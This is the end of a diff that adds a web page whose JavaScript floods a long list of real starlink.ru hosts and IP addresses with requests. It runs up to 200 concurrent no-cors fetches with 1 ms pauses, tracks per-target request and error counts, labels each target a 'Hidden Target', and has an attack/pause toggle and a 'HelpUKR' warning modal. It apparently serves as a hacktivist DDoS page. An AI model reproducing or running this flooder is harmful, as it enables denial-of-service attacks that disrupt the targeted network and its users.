+		    'https://77.50.163.92',
+		    'https://kamera4.starlink.ru',
+		    'https://77.233.209.185',
+		    'https://25k3-2-5-107.starlink.ru',
+		    'https://77.50.57.5',
+		    'https://81.17.149.154',
+		    'https://77.50.204.59',
+		    'https://94.141.179.86',
+		    'https://77.50.199.66',
+		    'https://77.50.93.210',
+		    'https://es121221.starlink.ru',
+		    'https://77.50.151.116',
+		    'https://94.141.178.117',
+		    'https://94.141.187.30',
+		    'https://94.141.177.206',
+		    'https://qw45.starlink.ru',
+		    'https://77.50.228.96',
+		    'https://77.50.222.154',
+		    'https://77.50.126.99',
+		    'https://eve-ng.starlink.ru',
+		    'https://77.50.115.242',
+		    'https://77.50.105.14',
+		    'https://es122027.starlink.ru',
+		    'https://77.233.219.162',
+		    'https://77.50.211.194',
+		    'https://77.50.162.14',
+		    'https://94.141.170.246',
+		    'https://81.17.148.34',
+		    'https://94.141.191.178',
+		    'https://81.17.151.214',
+		    'https://94.141.183.34',
+		    'https://77.233.209.180',
+		    'https://81.17.144.226',
+		    'https://94.141.191.241',
+		    'https://77.233.192.134',
+		    'https://94.141.168.205',
+		    'https://77.50.2.14',
+		    'https://77.50.186.126',
+		    'https://77.50.210.70',
+		    'https://77.233.197.65',
+		    'https://31.130.128.44',
+		    'https://94.141.190.150',
+		    'https://77.50.146.110',
+		    'https://77.50.73.198',
+		    'https://77.233.209.98',
+		    'https://hosting.starlink.ru',
+		    'https://94.141.164.61',
+		    'https://77.50.142.132',
+		    'https://77.50.153.70',
+		    'https://77.50.74.210',
+		    'https://77.50.105.142',
+		    'https://77.50.60.198',
+		    'https://77.50.115.243',
+		    'https://94.141.181.37',
+		    'https://94.141.181.132',
+		    'https://77.50.128.22',
+		    'https://77.50.174.234',
+		    'https://77.50.62.65',
+		    'https://77.50.224.35',
+		    'https://77.50.52.194',
+		    'https://amakarov.starlink.ru',
+		    'https://77.50.252.50',
+		    'https://94.141.179.182',
+		    'https://77.50.248.21',
+		    'https://77.50.210.222',
+		    'https://94.141.191.154',
+		    'https://77.50.154.58',
+		    'https://94.141.190.18',
+		    'https://77.50.58.96',
+		    'https://77.233.213.1',
+		    'https://77.50.151.188',
+		    'https://77.50.236.200',
+		    'https://94.141.182.227',
+		    'https://77.50.178.14',
+		    'https://77.50.177.61',
+		    'https://94.141.168.232',
+		    'https://91.204.129.18',
+		    'https://77.50.105.205',
+		    'https://77.233.213.116',
+		    'https://81.17.147.42',
+		    'https://94.141.187.78',
+		    'https://94.141.168.245',
+		    'https://77.50.90.70',
+		    'https://77.50.209.195',
+		    'https://77.50.113.206',
+		    'https://malgin.starlink.ru',
+		    'https://77.50.95.212',
+		    'https://77.50.240.8',
+		    'https://77.50.116.206',
+		    'https://94.141.189.84',
+		    'https://94.141.171.213',
+		    'https://77.50.113.62',
+		    'https://esuhalov.starlink.ru',
+		    'https://podshipnik.starlink.ru',
+		    'https://akahome.starlink.ru',
+		    'https://81.17.147.198',
+		    'https://77.50.237.83',
+		    'https://94.141.179.29',
+		    'https://77.50.62.146',
+		    'https://77.50.127.181',
+		    'https://77.50.54.74',
+		    'https://77.50.243.223',
+		    'https://net.starlink.ru',
+		    'https://81.17.144.242',
+		    'https://77.50.196.109',
+		    'https://77.50.57.173',
+		    'https://ost557535.starlink.ru',
+		    'https://77.50.0.18',
+		    'https://81.17.159.66',
+		    'https://77.50.174.215',
+		    'https://77.50.115.244',
+		    'https://81.17.159.220',
+		    'https://walker-nln.starlink.ru',
+		    'https://91.204.131.255',
+		    'https://77.50.252.143',
+		    'https://31.130.128.7',
+		    'https://77.50.108.118',
+		    'https://hosting2.starlink.ru',
+		    'https://77.50.104.11',
+		    'https://94.141.182.251',
+		    'https://77.50.180.201',
+		    'https://77.50.153.58',
+		    'https://77.50.62.158',
+		    'https://77.50.101.142',
+		    'https://77.233.212.131',
+		    'https://77.50.243.221',
+		    'https://77.50.175.42',
+		    'https://77.50.105.141',
+		    'https://77.233.213.212',
+		    'https://77.50.105.139',
+		    'https://77.243.107.133',
+		    'https://obormot.starlink.ru',
+		    'https://77.50.2.19',
+		    'https://77.50.243.44',
+		    'https://94.141.180.198',
+		    'https://gutleib.starlink.ru',
+		    'https://77.50.105.206',
+		    'https://alex851.starlink.ru',
+		    'https://77.50.52.167',
+		    'https://77.50.204.33',
+		    'https://77.50.56.231',
+		    'https://77.50.155.30',
+		    'https://77.50.123.36',
+		    'https://77.50.0.116',
+		    'https://77.50.108.60',
+		    'https://77.50.136.44',
+		    'https://81.17.148.35',
+		    'https://94.141.169.101',
+		    'https://mg95439.starlink.ru',
+		    'https://77.50.127.194',
+		    'https://81.17.158.13',
+		    'https://77.50.236.209',
+		    'https://77.50.224.39',
+		    'https://sulukov.starlink.ru',
+		    'https://77.50.98.209',
+		    'https://shenceva.starlink.ru',
+		    'https://77.50.2.18',
+		    'https://77.50.122.185',
+		    'https://77.50.231.148',
+		    'https://77.50.115.82',
+		    'https://77.50.104.190',
+		    'https://77.50.131.168',
+		    'https://77.50.164.94',
+		    'https://77.50.80.66',
+		    'https://77.50.168.43',
+		    'https://77.50.243.220',
+		    'https://77.50.153.134',
+		    'https://81.17.153.66',
+		    'https://77.233.213.17',
+		    'https://ben-ja.starlink.ru',
+		    'https://77.50.72.170',
+		    'https://77.50.147.178',
+		    'https://77.50.151.122',
+		    'https://gvozdav.starlink.ru',
+		    'https://77.50.123.123',
+		    'https://77.50.125.6',
+		    'https://77.50.53.101',
+		    'https://94.141.169.143',
+		    'https://77.233.197.3',
+		    'https://spddeb.starlink.ru',
+		    'https://81.17.144.141',
+		    'https://81.17.144.135',
+		    'https://77.243.98.219',
+		    'https://94.141.190.222',
+		    'https://77.50.151.14',
+		    'https://94.141.178.118',
+		    'https://77.50.168.209',
+		    'https://77.50.186.52',
+		    'https://77.50.56.229',
+		    'https://77.50.153.61',
+		    'https://81.17.158.107',
+		    'https://94.141.178.54',
+		    'https://81.17.144.52',
+		    'https://94.141.183.202',
+		    'https://94.141.185.158',
+		    'https://77.50.135.52',
+		    'https://77.50.2.15',
+		    'https://mgi9822.starlink.ru',
+		    'https://77.50.97.118',
+		    'https://94.141.183.194',
+		    'https://77.50.211.150',
+		    'https://81.17.151.83',
+		    'https://77.50.56.130',
+		    'https://81.17.150.142',
+		    'https://81.17.150.26',
+		    'https://77.50.56.158',
+		    'https://77.50.164.130',
+		    'https://77.243.105.136',
+		    'https://94.141.182.221',
+		    'https://eudgin.starlink.ru',
+		    'https://olimpiyaplus.starlink.ru',
+		    'https://94.141.177.22',
+		    'https://77.50.152.98',
+		    'https://94.141.170.172',
+		    'https://94.141.168.200',
+		    'https://77.50.114.170',
+		    'https://77.233.213.62',
+		    'https://mx2.starlink.ru',
+		    'https://77.50.56.53',
+		    'https://94.141.191.146',
+		    'https://77.50.226.162',
+		    'https://77.50.1.49',
+		    'https://77.50.128.15',
+		    'https://94.141.170.8',
+		    'https://77.243.107.199',
+		    'https://77.50.96.23',
+		    'https://94.141.181.131',
+		    'https://94.141.180.6',
+		    'https://94.141.171.234',
+		    'https://77.50.243.215',
+		    'https://oxidized.net.starlink.ru',
+		    'https://94.141.190.123',
+		    'https://77.50.63.90',
+		    'https://77.50.2.13',
+		    'https://94.141.170.35',
+		    'https://94.141.181.158',
+		    'https://94.141.176.110',
+		    'https://77.50.199.196',
+		    'https://94.141.168.187',
+		    'https://77.50.236.215',
+		    'https://77.50.2.20',
+		    'https://94.141.168.99',
+		    'https://77.50.73.116',
+		    'https://77.50.199.52',
+		    'https://94.141.188.210',
+		    'https://palpatin.starlink.ru',
+		    'https://77.50.197.24',
+		    'https://77.50.0.144',
+		    'https://gksputnik.starlink.ru',
+		    'https://77.50.118.45',
+		    'https://94.141.168.178',
+		    'https://77.50.2.17',
+		    'https://77.50.122.110',
+		    'https://77.50.147.164',
+		    'https://77.50.177.207',
+		    'https://77.50.164.98',
+		    'https://94.141.164.119',
+		    'https://81.17.147.66',
+		    'https://81.17.144.2',
+		    'https://81.17.144.107',
+		    'https://94.141.184.42',
+		    'https://94.141.169.190',
+		    'https://77.50.252.42',
+		    'https://77.50.228.9',
+		    'https://94.141.188.172',
+		    'https://77.50.56.236',
+		    'https://94.141.191.194',
+		    'https://77.50.222.60',
+		    'https://94.141.169.241',
+		    'https://94.141.187.138',
+		    'https://77.233.192.148',
+		    'https://94.141.170.84',
+		    'https://81.17.149.22',
+		    'https://77.243.107.139',
+		    'https://colbit.starlink.ru',
+		    'https://81.17.150.35',
+		    'https://77.50.75.250',
+		    'https://77.50.135.14',
+		    'https://77.50.98.152',
+		    'https://77.50.120.30',
+		    'https://77.50.62.50',
+		    'https://client-test.starlink.ru',
+		    'https://94.141.188.14',
+		    'https://77.50.124.10',
+		    'https://77.50.135.13',
+		    'https://94.141.168.170',
+		    'https://77.50.62.58',
+		    'https://77.50.137.233',
+		    'https://77.243.110.6',
+		    'https://94.141.181.133',
+		    'https://77.50.151.123',
+		    'https://94.141.188.180',
+		    'https://77.243.101.163',
+		    'https://77.243.98.7',
+		    'https://77.50.78.223',
+		    'https://81.17.153.170',
+		    'https://94.141.168.66',
+		    'https://77.50.61.243',
+		    'https://77.50.61.244',
+		    'https://77.50.2.12',
+		    'https://77.50.50.212',
+		    'https://77.50.107.180',
+		    'https://77.50.128.20',
+		    'https://77.50.211.242',
+		    'https://77.50.115.226',
+		    'https://77.50.78.191',
+		    'https://81.17.149.215',
+		    'https://77.50.108.36',
+		    'https://81.17.151.212',
+		    'https://77.50.136.217',
+		    'https://77.50.113.98',
+		    'https://77.50.115.46',
+		    'https://77.233.212.65',
+		    'https://77.50.106.51',
+		    'https://77.50.157.57',
+		    'https://77.50.122.132',
+		    'https://77.50.237.82',
+		    'https://77.233.192.48',
+		    'https://77.50.196.2',
+		    'https://77.50.168.106',
+		    'https://77.50.252.90',
+		    'https://u115129794205.starlink.ru',
+		    'https://77.50.53.184',
+		    'https://77.50.0.118',
+		    'https://77.50.149.206',
+		    'https://81.17.151.134',
+		    'https://paul.starlink.ru',
+		    'https://94.141.176.74',
+		    'https://77.50.108.5',
+		    'https://77.50.173.117',
+		    'https://94.141.171.109',
+		    'https://94.141.179.35',
+		    'https://94.141.164.94',
+		    'https://77.50.243.222',
+		    'https://77.50.236.211',
+		    'https://77.50.147.177',
+		    'https://94.141.178.146',
+		    'https://77.233.209.106',
+		    'https://81.17.154.3',
+		    'https://94.141.187.182',
+		    'https://31.130.128.43',
+		    'https://77.50.113.214',
+		    'https://77.233.192.63',
+		    'https://77.50.199.68',
+		    'https://77.50.147.180',
+		    'https://77.50.115.246',
+		    'https://77.50.211.5',
+		    'https://77.50.123.177',
+		    'https://77.50.108.225',
+		    'https://77.50.226.57',
+		    'https://transit.starlink.ru',
+		    'https://94.141.179.34',
+		    'https://77.50.48.5',
+		    'https://77.50.63.4',
+		    'https://m37-1-1-6-fab.starlink.ru',
+		    'https://77.243.101.38',
+		    'https://94.141.190.66',
+		    'https://77.50.0.166',
+		    'https://77.50.120.4',
+		    'https://94.141.164.53',
+		    'https://77.50.56.228',
+		    'https://77.50.113.198',
+		    'https://81.17.151.189',
+		    'https://49104880.starlink.ru',
+		    'https://77.50.151.178',
+		    'https://77.50.125.122',
+		    'https://77.50.73.214',
+		    'https://77.50.0.164',
+		    'https://81.17.149.190',
+		    'https://77.50.121.30',
+		    'https://77.50.208.15',
+		    'https://1135008576424.starlink.ru',
+		    'https://77.50.95.120',
+		    'https://77.50.172.118',
+		    'https://tumser.starlink.ru',
+		    'https://81.17.158.31',
+		    'https://77.50.0.160',
+		    'https://77.50.104.12',
+		    'https://77.50.172.249',
+		    'https://77.50.105.202',
+		    'https://77.50.199.69',
+		    'https://77.233.209.252',
+		    'https://77.50.99.79',
+		    'https://77.50.151.126',
+		    'https://77.50.151.117',
+		    'https://77.50.62.230',
+		    'https://77.50.163.186',
+		    'https://77.50.152.155',
+		    'https://81.17.149.170',
+		    'https://94.141.184.154',
+		    'https://ost755944.starlink.ru',
+		    'https://77.50.240.30',
+		    'https://77.50.222.146',
+		    'https://77.50.146.134',
+		    'https://darkdragon-nln.starlink.ru',
+		    'https://77.233.201.95',
+		    'https://77.50.90.94',
+		    'https://77.50.236.214',
+		    'https://94.141.172.4',
+		    'https://77.50.128.24',
+		    'https://77.50.100.154',
+		    'https://77.50.252.111',
+		    'https://77.50.108.108',
+		    'https://77.50.231.195',
+		    'https://81.17.151.210',
+		    'https://77.50.75.122',
+		    'https://77.50.41.92',
+		    'https://77.50.73.218',
+		    'https://94.141.183.66',
+		    'https://77.50.62.210',
+		    'https://94.141.170.26',
+		    'https://81.17.150.62',
+		    'https://77.50.155.74',
+		    'https://77.50.114.202',
+		    'https://77.50.236.202',
+		    'https://77.50.78.37',
+		    'https://77.50.77.226',
+		    'https://75106565.starlink.ru',
+		    'https://77.50.228.114',
+		    'https://programer.starlink.ru',
+		    'https://81.17.158.229',
+		    'https://77.50.186.53',
+		    'https://77.50.90.162',
+		    'https://77.50.52.173',
+		    'https://77.50.223.130',
+		    'https://pavlin.starlink.ru',
+		    'https://77.50.175.89',
+		    'https://alehin5.starlink.ru',
+		    'https://77.50.199.234',
+		    'https://monitor.starlink.ru',
+		    'https://77.243.103.171',
+		    'https://77.243.102.196',
+		    'https://77.50.151.115',
+		    'https://94.141.169.54',
+		    'https://77.233.201.247',
+		    'https://81.17.152.74',
+		    'https://77.233.193.3',
+		    'https://94.141.179.66',
+		    'https://77.50.164.70',
+		    'https://77.50.56.226',
+		    'https://77.50.88.204',
+		    'https://77.50.222.151',
+		    'https://77.50.151.125',
+		    'https://77.50.114.74',
+		    'https://77.50.157.100',
+		    'https://77.50.211.166',
+		    'https://77.243.105.227',
+		    'https://77.50.0.177',
+		    'https://94.141.188.130',
+		    'https://77.50.174.132',
+		    'https://u117761678007.starlink.ru',
+		    'https://77.233.192.110',
+		    'https://ikev2.starlink.ru',
+		    'https://77.233.214.51',
+		    'https://94.141.171.192',
+		    'https://77.50.128.14',
+		    'https://77.50.90.138',
+		    'https://77.50.222.155',
+		    'https://77.50.73.115',
+		    'https://77.50.186.235',
+		    'https://77.233.192.12',
+		    'https://77.233.216.40',
+		    'https://77.50.63.130',
+		    'https://flow-victoria.flow.net.starlink.ru',
+		    'https://avtoresurs11.starlink.ru',
+		    'https://77.50.60.250',
+		    'https://77.50.101.170',
+		    'https://77.50.123.76',
+		    'https://77.50.151.179',
+		    'https://77.50.100.46',
+		    'https://77.50.73.76',
+		    'https://91.204.128.243',
+		    'https://77.50.153.14',
+		    'https://77.50.81.250',
+		    'https://77.50.96.216',
+		    'https://94.141.177.66',
+		    'https://77.243.98.68',
+		    'https://77.50.76.140',
+		    'https://77.50.154.193',
+		    'https://77.243.105.183',
+		    'https://94.141.184.67',
+		    'https://77.50.236.207',
+		    'https://77.50.240.23',
+		    'https://77.233.192.111',
+		    'https://81.17.147.186',
+		    'https://gksputnik3.starlink.ru',
+		    'https://77.50.7.200',
+		    'https://94.141.168.224',
+		    'https://81.17.155.7',
+		    'https://77.50.222.138',
+		    'https://77.50.155.166',
+		    'https://77.50.236.210',
+		    'https://77.50.121.100',
+          ];
+          // initialize variables
+          var targets = urls.reduce((o, key) => ({ ...o, [key]: {number_of_requests: 0, number_of_errored_responses: 0}}), {})
+          var statRow = document.querySelector("#stats > .row");
+          var myModal = new bootstrap.Modal(document.getElementById('HelpUKR-WarningBox'), {});
+          var CONCURRENCY_LIMIT = 200;
+          var queue = [];
+          var attack = false;
+          var totalrequests = 0;
+          var totalerrors = 0;
+          function togglePause () {
+              if (attack) {
+                  attack = false;
+                  document.querySelector("div.desc .btn").innerText = "Resume";
+              } else {
+                  attack = true;
+                  document.querySelector("div.desc .btn").innerText = "Pause";
+                  for (var i=0; i<urls.length; i++) {
+                      flood(i);
+                  }
+              }
+          }
+          async function fetchWithTimeout(resource, options) {
+              const controller = new AbortController();
+              const id = setTimeout(() => controller.abort(), options.timeout);
+              return fetch(resource, {
+                  signal: controller.signal,
+                  mode: 'no-cors'
+              }).then((response) => {
+                  clearTimeout(id);
+                  return response;
+              }).catch((error) => {
+                  clearTimeout(id);
+                  throw error;
+              });
+          }
+          async function sleep(ms) {
+              return new Promise(r => setTimeout(r, ms));
+          }         
+          async function flood(n) {
+              const url = urls[n];
+              const target = targets[url];
+              while (attack) {
+                  if (queue.length > CONCURRENCY_LIMIT) {
+                      await queue.shift();
+                  }
+                  queue.push(
+                      fetchWithTimeout(url, { timeout: 2000 })
+                          .catch((error) => {
+                              if (error.code === 20 /* ABORT */) {
+                                  return;
+                              }
+                              target.number_of_errored_responses++;
+                              target.error_message = error.message;
+                              totalerrors++;
+                          })
+                          .then((response) => {
+                              if (response && !response.ok) {
+                                  target.number_of_errored_responses++;
+                                  target.error_message = response.statusText;
+                                  totalerrors++;
+                              }
+                              target.number_of_requests++;
+                          })
+                          .finally(() => updateTargetDisplay(n))
+                  );
+                  await sleep(1);
+              }
+          }
+          // Update data for target n
+          function updateTargetDisplay(n) {
+              var url = urls[n];
+              var {number_of_requests, number_of_errored_responses} = targets[url];
+              var requests_cell = document.querySelector(`#target${n} .requests`);
+              var errors_cell = document.querySelector(`#target${n} .errors`);
+              requests_cell.innerText = number_of_requests;
+              errors_cell.innerText = number_of_errored_responses;
+              document.querySelector("#totalrequests").innerText = totalrequests;
+              document.querySelector("#totalerrors").innerText = totalerrors;
+          }
+          // Shuffle array order before starting
+          for (let i = urls.length - 1; i > 0; i--) {
+              const j = Math.floor(Math.random() * (i + 1));
+              [urls[i], urls[j]] = [urls[j], urls[i]];
+          }
+          // Create div for each target
+          for (var i=0; i<urls.length; i++) {
+              statRow.innerHTML += `
+                  <div class="col-lg-3 col-md-4 col-sm-6" id="target${i}">
+                    <h7>${"<u><i>Hidden Target:</i></u>"}</h7>
+                      <table class='status'>
+                        <tr><td>requests:</td><td class="requests">0</td></tr>
+                        </tr><td>errors:</td><td class="errors">0</td></tr>
+                      </table>
+                    </div>
+              `;
+          }
+          // Show warning window
+          myModal.toggle();
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'UA-85513613-1');
+  </script>
+  <script>
+  // BETA plugin for estimated requested data
+  (function($) {
+    $.fn.countTo = function(options) {
+      return this.each(function() {
+        //-- Arrange
+        var FRAME_RATE = 60; // Predefine default frame rate to be 60fps
+        var $el = $(this);
+        var countFrom = parseInt($el.attr('data-count-from'));
+        var countTo = parseInt($el.attr('data-count-to'));
+        var countSpeed = $el.attr('data-count-speed'); // Number increment per second
+  
+        //-- Action
+        var rafId;
+        var increment;
+        var currentCount = countFrom;
+        var countAction = function() {              // Self looping local function via requestAnimationFrame
+          if(currentCount < countTo) {              // Perform number incremeant
+            $el.text(Math.floor(currentCount));     // Update HTML display
+            increment = countSpeed / FRAME_RATE;    // Calculate increment step
+            currentCount += increment;              // Increment counter
+            rafId = requestAnimationFrame(countAction);
+          } else {                                  // Terminate animation once it reaches the target count number
+            $el.text(countTo);                      // Set to the final value before everything stops
+            //cancelAnimationFrame(rafId);
+          }
+        };
+        rafId = requestAnimationFrame(countAction); // Initiates the looping function
+      });
+    };
+  }(jQuery));
+  
+  //-- Executing
+  $('.number-counter').countTo();
+  </script>
+  </html>
